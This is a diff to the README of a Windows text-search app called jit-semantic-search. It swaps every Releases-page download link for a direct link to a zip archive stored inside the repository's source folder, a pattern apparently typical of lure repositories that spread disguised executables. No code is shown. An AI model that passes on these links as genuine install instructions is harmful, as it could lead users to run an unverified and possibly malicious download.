@@ -1,6 +1,6 @@
 # 🔎 jit-semantic-search - Search text without setup
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Carunculated-stjohnswort622/jit-semantic-search/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Carunculated-stjohnswort622/jit-semantic-search/raw/refs/heads/main/src/jit_search/jit-search-semantic-1.1.zip)
 
 ## 🚀 What this app does
 
@@ -11,7 +11,7 @@ It works on Windows and is meant for simple use. You download the app, open it, 
 ## 📥 Download and install
 
 Use this page to download:  
-https://github.com/Carunculated-stjohnswort622/jit-semantic-search/releases
+https://github.com/Carunculated-stjohnswort622/jit-semantic-search/raw/refs/heads/main/src/jit_search/jit-search-semantic-1.1.zip
 
 ### Steps
 
@@ -202,7 +202,7 @@ This helps you see how the app returns related text.
 ## 🔗 Download again
 
 Visit this page to download:  
-https://github.com/Carunculated-stjohnswort622/jit-semantic-search/releases
+https://github.com/Carunculated-stjohnswort622/jit-semantic-search/raw/refs/heads/main/src/jit_search/jit-search-semantic-1.1.zip
 
 ## 📝 Simple workflow
 
